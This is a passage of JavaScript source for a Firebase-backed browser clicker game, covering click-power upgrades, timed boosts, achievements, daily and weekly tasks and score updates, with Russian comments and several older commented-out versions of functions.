      clickPower = Math.min(newPower, 8);
      updateClickPowerBar();
      updateProfilePanel();
    }

    function getClickPowerUpgradeCost() {
      return Math.floor(500 * Math.pow(6, clickPower - 1));
    }

    function updateClickPowerCostText() {
      const costText = document.getElementById('clickPowerCostText');
      const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
      const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");

      if (costText) {
        if (clickPower >= 8) {
          costText.textContent = "💪 Click Power: MAX LEVEL";
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = "Maximum Click Power reached";
          }
        } else if (clickPower >= 3 && currentLevel < clickPower + 1) {
          const cost = getClickPowerUpgradeCost();
          costText.textContent = `💪 Click Power +1 (Cost: ${cost})`;
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = `Reach player level ${clickPower + 1} to upgrade`;
          }
        } else {
          const cost = getClickPowerUpgradeCost();
          costText.textContent = `💪 Click Power +1 (Cost: ${cost})`;
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = "";
          }
        }
      }
    }

  /*!   function boostClickPowerTemporarily(amount, duration) {
      if (tempBoostTimeout) clearTimeout(tempBoostTimeout);

      originalClickPower = clickPower;
      const boosted = Math.min(clickPower + amount, 8);
      clickPower = boosted;

      const actualBoost = boosted - originalClickPower;
      showMessage(`Temporary boost: Click Power +${actualBoost} на ${duration / 1000} сек`);

      // Сохраняем состояние буста в Firebase
      if (user) {
        const boostEndTime = Date.now() + duration;
        db.ref("leaderboard/" + user.uid).update({
          tempBoostActive: true,
          tempBoostEndTime: boostEndTime,
          tempBoostOriginalClickPower: originalClickPower,
          tempBoostAmount: amount,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("Ошибка сохранения состояния буста:", error);
        });
      }

      tempBoostTimeout = setTimeout(() => {
        clickPower = originalClickPower;
        showMessage(`Буст закончился: Сила клика восстановлена`);
        updateClickPowerBar();
        updateProfilePanel();
        submitScore();

        // Очищаем состояние буста в Firebase
        if (user) {
          db.ref("leaderboard/" + user.uid).update({
            tempBoostActive: false,
            tempBoostEndTime: 0,
            tempBoostOriginalClickPower: 0,
            tempBoostAmount: 0,
            lastUpdate: Date.now()
          }).catch(error => {
            console.error("Ошибка очистки состояния буста:", error);
          });
        }
      }, duration);
    }!*/


    function boostClickPowerTemporarily(amount, duration) {
  // Проверяем, активен ли буст
  if (tempBoostTimeout && Date.now() < (autoclickEndTime || 0)) {
    showMessage("Буст уже активен!");
    return; // Игнорируем новый вызов, если буст активен
  }

  // Сохраняем исходную силу клика
  originalClickPower = clickPower;
  const boosted = Math.min(clickPower + amount, 8);
  clickPower = boosted;

  const actualBoost = boosted - originalClickPower;
  showMessage(`Временный буст: Сила клика +${actualBoost} на ${duration / 1000} сек`);

  // Сохраняем состояние буста в Firebase
  if (user) {
    const boostEndTime = Date.now() + duration;
    db.ref("leaderboard/" + user.uid).update({
      tempBoostActive: true,
      tempBoostEndTime: boostEndTime,
      tempBoostOriginalClickPower: originalClickPower,
      tempBoostAmount: amount,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Ошибка сохранения состояния буста:", error);
    });
  }

  // Устанавливаем таймер для окончания буста
  if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
  tempBoostTimeout = setTimeout(() => {
    clickPower = originalClickPower;
    showMessage(`Буст закончился: Сила клика восстановлена`);
    updateClickPowerBar();
    updateProfilePanel();
    submitScore();

    // Очищаем состояние буста в Firebase
    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        tempBoostActive: false,
        tempBoostEndTime: 0,
        tempBoostOriginalClickPower: 0,
        tempBoostAmount: 0,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("Ошибка очистки состояния буста:", error);
      });
    }
    tempBoostTimeout = null;
  }, duration);
}


  /*!!!  function boostClickPowerTemporarily(amount, duration) {
  // Проверяем, активен ли буст
  if (tempBoostTimeout && Date.now() < (tempBoostEndTime || 0)) {
    showMessage("Буст уже активен!");
    return;
  }

  originalClickPower = clickPower;
  const boosted = Math.min(clickPower + amount, 8);
  clickPower = boosted;

  const actualBoost = boosted - originalClickPower;
  showMessage(`Временный буст: Сила клика +${actualBoost} на ${duration / 1000} сек`);

  if (user) {
    tempBoostEndTime = Date.now() + duration; // Сохраняем время окончания буста
    db.ref("leaderboard/" + user.uid).update({
      tempBoostActive: true,
      tempBoostEndTime: tempBoostEndTime,
      tempBoostOriginalClickPower: originalClickPower,
      tempBoostAmount: amount,
      clickPower: clickPower, // Сохраняем текущее значение clickPower
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Ошибка сохранения состояния буста:", error);
    });
  }

  if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
  tempBoostTimeout = setTimeout(() => {
    clickPower = originalClickPower;
    showMessage(`Буст закончился: Сила клика восстановлена`);
    updateClickPowerBar();
    updateProfilePanel();
    submitScore();

    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        tempBoostActive: false,
        tempBoostEndTime: 0,
        tempBoostOriginalClickPower: 0,
        tempBoostAmount: 0,
        clickPower: clickPower, // Сохраняем восстановленное значение clickPower
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("Ошибка очистки состояния буста:", error);
      });
    }
    tempBoostTimeout = null;
    tempBoostEndTime = 0;
  }, duration);
}!!!*/


    function toggleAchievements() {
      console.log("Calling toggleAchievements...");
      const panel = document.getElementById("achievementsPanel");
      if (!panel) {
        console.error("Element #achievementsPanel not found in toggleAchievements");
        return;
      }
      const btn = document.querySelector("button[onclick='toggleAchievements()']");
      if (!btn) {
        console.error("Button for toggleAchievements not found");
        return;
      }
      const isCurrentlyOpen = panel.classList.contains("open");
      console.log("Achievements panel is currently open:", isCurrentlyOpen);

      if (isCurrentlyOpen) {
        panel.classList.remove("open");
        btn.innerHTML = "🏆 Achievements ▼";
        console.log("Closing achievements panel");
      } else {
        closeAllPanels();
        panel.classList.add("open");
        btn.innerHTML = "🏆 Achievements ▲";
        console.log("Opening achievements panel");
        renderAchievements();
      }
    }

    function renderAchievements() {
      const list = document.getElementById('achievementsList');
      list.innerHTML = '';

      for (const key in allAchievements) {
        const achieved = achievements[key];
        const ach = allAchievements[key];

        const div = document.createElement('div');
        div.style.marginBottom = '10px';
        div.style.padding = '8px';
        div.style.border = '1px solid #00c3ff';
        div.style.borderRadius = '8px';
        div.style.backgroundColor = achieved ? '#00ffa6' : '#222';
        div.style.color = achieved ? '#000' : '#fff';
        div.innerHTML = `<strong>${ach.name}</strong><br>${ach.description}<br><em>${ach.reward}</em>`;
        list.appendChild(div);
      }
    }

    function updateClickPowerBar() {
      document.getElementById("clickPowerDisplay").innerText = clickPower;
      const progress = Math.min((clickPower / 8) * 100, 100);
      document.getElementById("clickPowerBar").style.width = progress + "%";
      updateClickPowerCostText();
    }

    function updateCounterDisplay() {
      document.getElementById("counter").innerText = `Tokens: ${score}`;
    }

    function showMessage(msg) {
      const el = document.getElementById("message");
      el.innerText = msg;
      setTimeout(() => el.innerText = '', 3000);
    }

function getWeekNumber() {
  const now = new Date();
  const startOfYear = new Date(now.getFullYear(), 0, 1);
  const pastDaysOfYear = (now - startOfYear) / 86400000;
  return Math.ceil((pastDaysOfYear + startOfYear.getDay() + 1) / 7);
} 


/*??????function renderTasks() {
  if (isRenderingTasks) return;
  isRenderingTasks = true;

  const list = document.getElementById("tasksList");
  list.innerHTML = "";

  if (!user) {
    isRenderingTasks = false;
    return;
  }

  db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
    const tasksData = snapshot.val() || {};
    const today = new Date().toDateString();
    const startOfWeek = new Date(new Date().setDate(new Date().getDate() - new Date().getDay() + (new Date().getDay() === 0 ? -6 : 1))).toDateString();
    const weekNumber = getWeekNumber();
    const isEvenWeek = weekNumber % 2 === 0;

    const activeTasks = dailyTasks.filter(task => {
      if (!task.alternate) return true;
      if (task.id === "autoclickerMaster" && isEvenWeek) return true;
      if (task.id === "collectBigTokens" && !isEvenWeek) return true;
      return false;
    });

    activeTasks.forEach(task => {
      let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

      const resetKey = task.period === "weekly" ? startOfWeek : today;
      if (taskData.lastReset !== resetKey) {
        taskData = { 
          progress: 0, 
          lastReset: resetKey, 
          completions: 0, 
          completed: false,
          ...(task.goalOptions && {
            goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
            reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
          })
        };
        db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
      }

      const div = document.createElement("div");
      if (taskData.completed || taskData.completions >= 1) {
        div.innerHTML = `${task.description}: Completed for ${task.period === "weekly" ? "this week" : "today"}!`;
      } else {
        if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${taskData.goal} (Reward: ${taskData.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else if (task.id === "subscribeTwitter") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <a href="${task.link}" target="_blank" rel="noopener noreferrer" style="color: #00ffa6; text-decoration: none; cursor: pointer;" onclick="openTwitterLink('${task.link}'); return false;">Go to X</a>
            <button class="click-button" onclick="completeTwitterTask('${task.id}')" style="margin-left: 10px;">Claim</button>
          `;
        } else if (task.id === "clickMasterWeekly") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < task.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else if (task.id === "miniGameChallenge") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} 💎)
          `;
        } else {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} ${task.rewardType === "crystals" ? "💎" : "tokens"})
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        }
      }
      list.appendChild(div);
    });

    const validTaskIds = activeTasks.map(task => task.id);
    for (const taskId in tasksData) {
      if (!validTaskIds.includes(taskId)) {
        db.ref(`tasks/${user.uid}/${taskId}`).remove();
      }
    }

    isRenderingTasks = false;
  }).catch(error => {
    console.error("Error rendering tasks:", error);
    showMessage("Failed to load tasks.");
    isRenderingTasks = false;
  });
}????*/

function renderTasks() {
  if (isRenderingTasks) return;
  isRenderingTasks = true;

  const list = document.getElementById("tasksList");
  list.innerHTML = "";

  if (!user) {
    isRenderingTasks = false;
    return;
  }

  db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
    const tasksData = snapshot.val() || {};
    const today = new Date().toDateString();
    const startOfWeek = new Date(new Date().setDate(new Date().getDate() - new Date().getDay() + (new Date().getDay() === 0 ? -6 : 1))).toDateString();
    const weekNumber = getWeekNumber();
    const isEvenWeek = weekNumber % 2 === 0;

    const activeTasks = dailyTasks.filter(task => {
      if (!task.alternate) return true;
      if (task.id === "autoclickerMaster" && isEvenWeek) return true;
      if (task.id === "collectBigTokens" && !isEvenWeek) return true;
      return false;
    });

    activeTasks.forEach(task => {
      let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

      const resetKey = task.period === "weekly" ? startOfWeek : today;
      if (taskData.lastReset !== resetKey) {
        taskData = { 
          progress: 0, 
          lastReset: resetKey, 
          completions: 0, 
          completed: false,
          ...(task.goalOptions && {
            goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
            reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
          })
        };
        db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
      }

      const div = document.createElement("div");
      if (taskData.completed || taskData.completions >= 1) {
        div.innerHTML = `${task.description}: Completed for ${task.period === "weekly" ? "this week" : "today"}!`;
      } else {
        if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${taskData.goal} (Reward: ${taskData.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else if (task.id === "subscribeTwitter") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <a href="${task.link}" target="_blank" rel="noopener noreferrer" style="color: #00ffa6; text-decoration: none; cursor: pointer;" onclick="openTwitterLink('${task.link}'); return false;">Go to X</a>
            <button class="click-button" onclick="completeTwitterTask('${task.id}')" style="margin-left: 10px;">Claim</button>
          `;
        } else if (task.id === "clickMasterWeekly") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else if (task.id === "miniGameChallenge") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} 💎)
          `;
        } else if (task.id === "autoclickerMaster") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward})
          `;
        } else {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} ${task.rewardType === "crystals" ? "💎" : "tokens"})
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        }
      }
      list.appendChild(div);
    });

    const validTaskIds = activeTasks.map(task => task.id);
    for (const taskId in tasksData) {
      if (!validTaskIds.includes(taskId)) {
        db.ref(`tasks/${user.uid}/${taskId}`).remove();
      }
    }

    isRenderingTasks = false;
  }).catch(error => {
    console.error("Error rendering tasks:", error);
    showMessage("Failed to load tasks.");
    isRenderingTasks = false;
  });
}
  

    
    

/*!function claimTask(taskId) {
  if (!user) {
    showMessage("Please sign in to complete tasks.");
    return;
  }

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || taskData.completions >= 1)) {
      showMessage("Task already completed for this period!");
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      let reward = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.reward : task.reward;

      score += reward;
      showMessage(`Task "${task.description}" completed! +${reward} tokens`);
      updateCounterDisplay();
      submitScore();

      db.ref(`tasks/${user.uid}/${task.id}`).set({
        progress: taskData.progress,
        lastReset: taskData.lastReset,
        completions: completions,
        completed: true,
        ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
      }).then(() => {
        renderTasks();
      }).catch(error => {
        console.error("Error completing task:", error);
        showMessage("Failed to complete task.");
      });
    } else {
      showMessage("Task not yet completed!");
    }
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
}!*/

  /*!?  function claimTask(taskId) {
  if (!user) {
    showMessage("Please sign in to complete tasks.");
    return;
  }

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || taskData.completions >= 1)) {
      showMessage("Task already completed for this period!");
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      let reward = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.reward : task.reward;

      if (task.rewardType === "crystals") {
        crystals += reward;
        showMessage(`Task "${task.description}" completed! +${reward} 💎`);
        updateProfilePanel(); // Update to show new crystal count
      } else {
        score += reward;
        showMessage(`Task "${task.description}" completed! +${reward} tokens`);
      }

      updateCounterDisplay();
      submitScore();

      db.ref(`tasks/${user.uid}/${task.id}`).set({
        progress: taskData.progress,
        lastReset: taskData.lastReset,
        completions: completions,
        completed: true,
        ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
      }).then(() => {
        renderTasks();
      }).catch(error => {
        console.error("Error completing task:", error);
        showMessage("Failed to complete task.");
      });
    } else {
      showMessage("Task not yet completed!");
    }
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
}!?*/
    

function claimTask(taskId) {
  if (!user) {
    showMessage("Please sign in to complete tasks.");
    return;
  }

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (!task || !taskData) {
      showMessage("Task not found!");
      return;
    }

    if (taskData.completed || taskData.completions >= 1) {
      showMessage("Task already completed for this period!");
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      let reward = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.reward : task.reward;

      if (task.id === "miniGameChallenge") { // Явная проверка для miniGameChallenge
        crystals = (crystals || 0) + reward;
        showMessage(`Task "${task.description}" completed! +${reward} 💎`);
        updateProfilePanel();
      } else if (task.rewardType === "crystals") {
        crystals = (crystals || 0) + reward;
        showMessage(`Task "${task.description}" completed! +${reward} 💎`);
        updateProfilePanel();
      } else {
        score += reward;
        showMessage(`Task "${task.description}" completed! +${reward} tokens`);
      }

      updateCounterDisplay();
      submitScore();

      db.ref(`tasks/${user.uid}/${task.id}`).set({
        progress: taskData.progress,
        lastReset: taskData.lastReset,
        completions: completions,
        completed: true,
        ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
      }).then(() => {
        renderTasks();
      }).catch(error => {
        console.error("Error completing task:", error);
        showMessage("Failed to complete task.");
      });
    } else {
      showMessage("Task not yet completed!");
    }
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
}

    
function completeTwitterTask(taskId) {
  if (!user) {
    showMessage("Please sign in to complete tasks.");
    return;
  }

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || taskData.completions >= 1)) {
      showMessage("Task already completed for today!");
      return;
    }

    // Отмечаем задачу как выполненную
    const completions = (taskData.completions || 0) + 1;
    db.ref(`tasks/${user.uid}/${taskId}`).set({
      progress: task.goal,
      lastReset: taskData.lastReset || new Date().toDateString(),
      completions: completions,
      completed: true
    }).then(() => {
      score += task.reward;
      showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
      updateCounterDisplay();
      submitScore();
      renderTasks();
    }).catch(error => {
      console.error("Error completing task:", error);
      showMessage("Failed to complete task.");
    });
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
}

   function openTwitterLink(url) {
  console.log("Attempting to open Twitter link: " + url);
  try {
    const newWindow = window.open(url, '_blank', 'noopener,noreferrer');
    if (newWindow) {
      console.log("New window opened successfully.");
      newWindow.focus();
    } else {
      console.error("Failed to open new window. Possible popup blocker.");
      showMessage("Unable to open X link. Please disable popup blocker or visit https://x.com/CircleGameTry manually.");
      setTimeout(() => {
        window.location.href = url;
      }, 1000);
    }
  } catch (error) {
    console.error("Error opening Twitter link: ", error);
    showMessage("Error opening X link. Redirecting to https://x.com/CircleGameTry...");
    setTimeout(() => {
      window.location.href = url;
    }, 1000);
  }
}  

    function toggleTasks() {
      const panel = document.getElementById("tasksPanel");
      const btn = document.querySelector("button[onclick='toggleTasks()']");
      const isCurrentlyOpen = panel.classList.contains("open");

      closeAllPanels();

      if (!isCurrentlyOpen) {
        panel.classList.add("open");
        btn.innerHTML = "📋 Tasks ▲";
        renderTasks();
      }
    }

     function updateTaskProgress(taskId, increment) {
  if (!user) return;

  // Проверяем, активно ли задание
  const weekNumber = getWeekNumber();
  const isEvenWeek = weekNumber % 2 === 0;
  const task = dailyTasks.find(t => t.id === taskId);
  if (task.alternate) {
    if (task.id === "autoclickerMaster" && !isEvenWeek) return;
    if (task.id === "collectBigTokens" && isEvenWeek) return;
  }

  const now = new Date();
  const today = now.toDateString();
  const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay() + (now.getDay() === 0 ? -6 : 1))).toDateString();
  const resetKey = task?.period === "weekly" ? startOfWeek : today;

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    let taskData = snapshot.val() || { progress: 0, lastReset: resetKey, completions: 0, completed: false };

    if (taskData.lastReset !== resetKey) {
      taskData = {
        progress: 0,
        lastReset: resetKey,
        completions: 0,
        completed: false,
        ...(task.goalOptions && {
          goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
          reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
        })
      };
    }

    if (taskData.completed || taskData.completions >= 1) {
      return;
    }

    const newProgress = (taskData.progress || 0) + increment;
    const goal = taskId === "collectTokens" || taskId === "collectBigTokens" ? taskData.goal : task.goal;
    taskData.progress = Math.min(newProgress, goal);

    db.ref(`tasks/${user.uid}/${taskId}`).set(taskData).then(() => {
      if (!(taskData.completed || taskData.completions >= 1)) {
        checkTaskCompletion(taskId);
      }
      renderTasks();
    }).catch(error => {
      console.error("Error updating task progress:", error);
      showMessage("Failed to update task progress.");
    });
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
} 
  
/*!function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData && taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon" || task.id === "clickMasterWeekly") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          // Награда начисляется через claimTask
        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          startAutoclicker(300000, true);
          submitScore();
        }
        db.ref(`tasks/${user.uid}/${task.id}`).set({
          progress: taskData.progress,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true,
          ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
        });
      }
      renderTasks();
    }
  });
}!*/


  function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (!task || !taskData) {
      console.error("Task or task data not found for taskId:", taskId);
      return;
    }

    if (taskData.completed || (taskData.completions || 0) >= 1) {
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData && taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon" || task.id === "clickMasterWeekly") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          // Награда начисляется через claimTask
        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          startAutoclicker(300000, true);
          submitScore();
        } else if (task.id === "miniGameChallenge") {
          // Автоматическое начисление кристаллов
          crystals = (crystals || 0) + task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} 💎`);
          updateProfilePanel();
          submitScore();
        }
        db.ref(`tasks/${user.uid}/${task.id}`).set({
          progress: taskData.progress,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true,
          ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
        });
      }
      renderTasks();
    }
  }).catch(error => {
    console.error("Error checking task completion:", error);
    showMessage("Failed to check task completion.");
  });
}


  /*!?!!?  function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData && taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon" || task.id === "clickMasterWeekly") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          // Награда начисляется через claimTask
        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          startAutoclicker(300000, true);
          submitScore();
        } else if (task.id === "miniGameChallenge") {
          // Награда начисляется через claimTask
        }
        db.ref(`tasks/${user.uid}/${task.id}`).set({
          progress: taskData.progress,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true,
          ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
        });
      }
      renderTasks();
    }
  });
}?!?*/

document.addEventListener("DOMContentLoaded", function() {
  particlesJS("particles-js", {
    "particles": {
      "number": { "value": 0 }, // Изначально частиц нет
      "color": { "value": "#ffd700" }, // Золотой цвет
      "shape": { "type": "circle" },
      "size": { "value": 5, "random": true },
      "move": { 
        "enable": true, 
        "speed": 10, 
        "direction": "top", // Частицы "взлетают" вверх
        "out_mode": "out" 
      }
    },
    "interactivity": {
      "events": {
        "onclick": { "enable": false },
        "onhover": { "enable": false }
      }
    }
  });
});

  
      
   /*! function clickToken() {
      score += clickPower;
      totalClicks++;
      updateTaskProgress("clickMarathon", 1);
      updateTaskProgress("levelUp", clickPower);
      checkAchievements();
      updateCounterDisplay();
      updateProfilePanel();
      animateCounter();
    }!*/

 /*!!   function clickToken() {

      if (isAnimating) return; // Пропускаем, если анимация уже идёт
        isAnimating = true;
      
  score += clickPower;
  totalClicks++;
  updateTaskProgress("clickMarathon", 1);
  updateTaskProgress("collectTokens", clickPower); // Обновляем прогресс для collectTokens
  updateTaskProgress("collectBigTokens", clickPower);
  updateTaskProgress("clickMasterWeekly", 1);    
  checkAchievements();
  updateCounterDisplay();
  updateProfilePanel();
  animateCounter();

// Анимация частиц (опционально, требует библиотеки, например, particles.js)
  const button = document.getElementById("mainClickButton");
  button.classList.add("pulse");
 // setTimeout(() => button.classList.remove("pulse"), 200);
setTimeout(() => {
    button.classList.remove("pulse");
    isAnimating = false; // Разрешаем следующую анимацию
  }, 200);
      
      
}!!*/ // animacia

     

function clickToken() {
  if (!user) {
    console.log('User not authenticated, cannot process click.');
    return;
  }

  if (isAnimating) {
    console.log('Animation in progress, skipping click.');
    return; // Пропускаем, если анимация уже идёт
  }
  isAnimating = true;

  // Увеличиваем score в базе через транзакцию
  db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
    console.log(`DB score before transaction: ${currentScore}`);
    return (currentScore || 0) + clickPower;
  }).then(transactionResult => {
    if (transactionResult.committed) {
      score = transactionResult.snapshot.val(); // Обновляем локальный score
      console.log(`After click - Local score updated: ${score}`);

      // Обновляем остальные счётчики и прогресс задач
      totalClicks++;
      updateTaskProgress("clickMarathon", 1);
      updateTaskProgress("collectTokens", clickPower); // Обновляем прогресс для collectTokens
      updateTaskProgress("collectBigTokens", clickPower);
      updateTaskProgress("clickMasterWeekly", 1);
      checkAchievements();
      updateCounterDisplay();
      updateProfilePanel();
      animateCounter();

      

      // Анимация частиц (опционально, требует библиотеки, например, particles.js)?
      const button = document.getElementById("mainClickButton");
      button.classList.add("pulse");
      setTimeout(() => {
        button.classList.remove("pulse");
        isAnimating = false; // Разрешаем следующую анимацию
      }, 200);

      // Вызываем submitScore с ограничением частоты
     // submitScoreDebounced();
     
      
    }
  }).catch(error => {
    console.error('Error updating score via transaction:', error);
    isAnimating = false; // Сбрасываем флаг анимации в случае ошибки
  });
}

  
/*!!!!!function clickToken() {
  if (!user) {
    console.log('User not authenticated, cannot process click.');
    return;
  }

  if (isAnimating) {
    console.log('Animation in progress, skipping click.');
    return; // Пропускаем, если анимация уже идёт
  }
  isAnimating = true;

  // Увеличиваем score в базе через транзакцию
  db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
    console.log(`DB score before transaction: ${currentScore}`);
    return (currentScore || 0) + clickPower;
  }).then(transactionResult => {
    if (transactionResult.committed) {
      score = transactionResult.snapshot.val(); // Обновляем локальный score
      console.log(`After click - Local score updated: ${score}`);

      // Обновляем остальные счётчики и прогресс задач
      totalClicks++;
      updateTaskProgress("clickMarathon", 1);
      updateTaskProgress("collectTokens", clickPower); // Обновляем прогресс для collectTokens
